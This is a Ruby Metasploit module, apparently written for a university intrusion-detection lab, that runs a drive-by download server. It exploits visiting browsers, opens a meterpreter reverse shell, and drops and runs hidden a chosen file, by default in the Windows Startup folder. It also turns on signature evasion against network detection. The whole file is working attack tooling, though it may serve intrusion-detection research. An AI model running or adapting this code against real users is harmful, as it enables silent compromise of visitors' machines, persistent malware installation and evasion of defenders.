##
# driveby_dropper.rb
#
# Module which sets up a malicious web server which will exploit
# visiting browsers, dropping a specified payload in a specified
# location without prompt.
#
# Aubrey Alston (ada2145@columbia.edu)
#
# (This module and reliant files must be placed into Metasploit modules directory.)
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'fileutils'

class Metasploit3 < Msf::Auxiliary

	def initialize(info = {})
		super(update_info(info,
		  'Name'           => 'IDS Drive-by Dropper',
		  'Description'    => %q{
		  	Instantiates a malicious web server using a specified browser exploit/payload to drop
		  	a specified file onto visiting browsers in a specified directory. 
		  },
		  'Author'         => [ 'Aubrey Alston, IDS Laboratory, Columbia University (ada2145@columbia.edu)' ],
		  'License'        => MSF_LICENSE
		))
		register_options(
		[
		  OptString.new('EXPLOIT', [ false, 'Set browser exploit to use.', "auxiliary/pro/ids/blind_firefox_crmfrequest" ]),
		  OptString.new('SHELL', [false, 'Set reverse shell payload to use with this exploit.', "windows/meterpreter/reverse_tcp"]),
		  OptInt.new('TARGET', [false, 'Set desired target for this payload. (See "SHOW TARGETS" for used exploit.)', 1]),
		  OptString.new('HOST', [false, 'Set host for the web server.', "127.0.0.1"]),
		  OptString.new('SRVPORT', [false, 'Set port for the web server.', "8080"]),
		  OptString.new('URIPATH', [false, 'Set malicious URL path.', "/"]),
		  OptString.new('LPORT', [false, 'set LPORT for reverse shell.', "4444"]),
		  OptString.new('DROPDIRS', [false, 'Location on target to place file once compromised (separate by semi-colons).', 
		  	'C:/Documents and Settings/All Users/Start Menu/Programs/Startup']),
		  OptString.new('DROPFILE', [true, "File to drop onto target's machine."]),
		  OptString.new('DROPNAME', [true, "Destination name for file dropped onto target's machine."]),
      OptBool.new('NETWORK_EVADE', [true, "Set to true to attempt network evasion.", true])
		], self.class)

		@drop_script = nil
		@mal_instance = nil
		@handler = nil
  end

  def run

  	# Generate the script which drops the file once a session is obtained.
  	print_status("Generating drop script.")
  	original_dir = Dir.pwd
  	Dir.chdir(File.dirname(__FILE__))

  	# Create directories as needed
  	unless File.directory?("tmp")
      FileUtils.mkdir_p("tmp")
      print_status("tmp directory created.")
    end

    unless File.directory?("tmp/drop")
      FileUtils.mkdir_p("tmp/drop")
      print_status("tmp/drop directory created.")
    end

    # Create tag file
    File.open("tmp/tag.txt", 'w') do |file|
      file.puts "You're it!"
    end

    # Write the drop script
  	File.open("tmp/drop/drop"+self.uuid+".rc", 'w') do |file|
  	  dirs = datastore["DROPDIRS"].split(";")
  	  for dir in dirs
      	file.puts 'cd "'+dir+'"'
      	file.puts 'upload "'+datastore["DROPFILE"]+'" "'+datastore["DROPNAME"]+'"'
        file.puts 'execute -H -f "'+datastore["DROPNAME"]+'"'
        # If this point is reached, that means that the executable was able to 
        # execute out of the sandbox [wasn't detected].  If this file exists
        # at this point, the target is infected.
        file.puts 'upload "'+File.dirname(__FILE__)+'/tmp/tag.txt" "tag.txt"'
      end
      file.puts 'exit'
    end

    print_status("Drop script created.")

    @drop_script = File.absolute_path("tmp/drop/drop"+self.uuid+".rc")

  	Dir.chdir(original_dir)

  	# Start the session handler
  	print_status("Starting handler for reverse shell.")
  	@handler = framework.modules.create("exploit/multi/handler")
  	@handler.datastore["LHOST"] = datastore["HOST"]
  	@handler.datastore["LPORT"] = datastore["LPORT"]
  	@handler.datastore["ExitOnSession"] = false
  	@handler.datastore["AutoRunScript"] = "multi_console_command -rc " + @drop_script
    if datastore["NETWORK_EVADE"]
      @handler.datastore["EnableStageEncoding"] = true
    end
  	@handler.exploit_simple(
  		'LocalInput'	=> self.user_input,
  		'LocalOutput'	=> self.user_output,
  		'Payload'		=> datastore["SHELL"],
  		'RunAsJob'		=> true
  	)

  	@handler = framework.jobs[@handler.job_id.to_s].ctx[0]

  	print_status("Starting malicious server instance.")
  	# Initialize exploit module and set payload
  	@mal_instance = framework.modules.create(datastore["EXPLOIT"])
    while @mal_instance.nil?
      @mal_instance = framework.modules.create(datastore["EXPLOIT"])
    end
  	@mal_instance.datastore["SRVHOST"] = datastore["HOST"]
  	@mal_instance.datastore["SRVPORT"] = datastore["SRVPORT"]
  	@mal_instance.datastore["URIPATH"] = datastore["URIPATH"]
  	@mal_instance.datastore["LHOST"] = datastore["HOST"]
  	@mal_instance.datastore["LPORT"] = datastore["LPORT"]
  	@mal_instance.datastore["DisablePayloadHandler"] = true
    # Evade detection of exploit at network level with random space injection (changes signature) (Add more of these)
    if datastore["NETWORK_EVADE"]
      @mal_instance.datastore["HTML::base64"] = "random_space_injection";
    end
  	@mal_instance.exploit_simple(
  		'LocalInput'	=> self.user_input,
  		'LocalOutput'	=> self.user_output,
  		'Target'		=> datastore["TARGET"],
  		'Payload'		=> datastore["SHELL"],
      'DisablePayloadHandler' => true,
  		'RunAsJob'		=> true
  	)

  	@mal_instance = framework.jobs[@mal_instance.job_id.to_s].ctx[0]

    while not @mal_instance.nil?
      Rex::ThreadSafe.sleep(5)
    end
  	
  end

  # Kill the instance and clean up.
  def cleanup
  	print_status("Stopping drive-by drop server and cleaning up resources.")
  	if not @mal_instance.nil?
  		@mal_instance.cleanup
  		@mal_instance = nil
  	end
  	if not @handler.nil?
  		@handler.cleanup
  		@handler = nil
  	end
  	if not @drop_script.nil?
  		if File.exist?(@drop_script)
  			File.delete(@drop_script)
  		end
  	end
  end

end